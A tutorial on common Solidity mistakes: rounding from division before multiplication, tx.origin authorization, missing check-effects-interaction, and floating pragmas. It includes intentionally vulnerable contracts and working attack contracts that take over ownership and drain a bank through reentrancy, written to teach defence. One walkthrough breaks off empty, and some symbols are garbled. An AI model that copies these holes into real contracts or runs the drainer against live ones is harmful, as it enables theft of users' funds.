## Division before multiplication

In Solidity, division always rounds down to the nearest whole number (_0.333 rounds down to 0_).
This can lead to unintended zero values or significant precision loss if you're not careful with the order of operations.

Let's say you want to calculate 25% of a value. A common mistake is doing the division before the multiplication, like this:

```solidity
uint256 portion = value / 4 * 100;
```

If value is less than 4, `value / 4` will be 0, and multiplying that by 100 still gives 0.
Even with larger values, the rounding can reduce accuracy.

```solidity
uint256 value = 3;

uint256 portion = value / 4 * 100; // portion = 0 ‚ùå [!code --]

uint256 portion = value * 100 / 4; // portion = 75 ‚úÖ [!code ++]
```

Multiplying first preserves precision because no rounding occurs before the larger operation:

```solidity
// Wrong:
value = 3
portion = 3 / 4 * 100 = 0 * 100 = 0

// Right:
portion = 3 * 100 / 4 = 300 / 4 = 75
```

## Using `msg.sender` instead of `tx.origin`

`tx.origin` is a global variable which returns the address that created the original transaction.

**_EXAMPLE_** if User calls `Contract A`, which then calls `contract B` within the same transaction -- when checked from inside `Contract B`:

- `msg.sender` will be equal to `Contract A` .
- `tx.origin` will be the `User` regardless of where you check it from.

Let's build and hack this example

```solidity
contract Good {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function setOwner(address newOwner) public {
        require(tx.origin == owner, "Not owner");
        owner = newOwner;
    }
}
```

```solidity
import "./Good.sol";

contract Attack {
    Good public good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOwner(address(this));
    }
}
```

The attack will happen as follows

1. initially `address1` will deploy `Good.sol` and will be the owner
2. The attacker will **somehow fool the user** who has the private key of `address1` to call the `attack` function with `Attack.sol`.
3. When the user calls `attack` function with `address1`, `tx.origin` is set to `address1`. `attack` function further calls `setOwner` function of `Good.sol` which first checks if `tx.origin` is indeed the owner which is `true` because the original transaction was indeed called by `address1`. After verifying the owner, it sets the owner to `Attack.sol`
4. thus attacker is successfully able to change the owner of `Good.sol` ü§Ø

## Not Following Check-effects-interaction

In Solidity, following the ‚Äúcheck-effects-interaction‚Äù pattern is crucial to prevent **re-entrancy attacks**.
This means that calling another contract or sending ETH to another address should be the last operation in a function.
Failure to do so can leave the contract vulnerable to malicious attacks.

The following contract `BadBank` does not follow check-effects-interaction and thus can be drained of ETH.

```solidity
pragma solidity 0.8.26;

contract BadBank {
    mapping(address => uint256) public balances;

    constructor() payable {
        require(msg.value == 10 ether, "deposit 10 eth");
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        (bool ok, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(ok, "transfer failed");
        balances[msg.sender] = 0;
    }
}
```

The following attack contract can be used to drain the bank:

```solidity
contract BankDrainer {
    function steal(BadBank bank) external payable {
        require(msg.value == 1 ether, "send deposit 1 eth");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        // msg.sender is the BadBank because the BadBank
        // called `receive()` when it transfered either

        while (msg.sender.balance >= 1 ether) {
            BadBank(msg.sender).withdraw();
        }
    }
}
```

The attack will happen as follows

## Not Fixing the Solidity Pragma

When you read the code of Solidity libraries, you'll often see something like this or similar at the top.
Because of this, newer developers tend to blindly copy this pattern.

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
```

However, setting the Solidity version with `^0.8.0` is **only appropriate for libraries**.
The author distributing the library doesn't know the exact version a later programmer will compile it with, so they only set a minimum version.

As a developer deploying the application, you know which version of the compiler you are using to compile the code.
Therefore you **should lock the version to the exact one** `0.8.0` you used so it's clearer to others auditing the code which version of the Solidity compiler you used.

```solidity
pragma solidity ^0.8.0; // ‚ùå [!code --]
pragma solidity 0.8.21; // ‚úÖ  [!code ++]
```
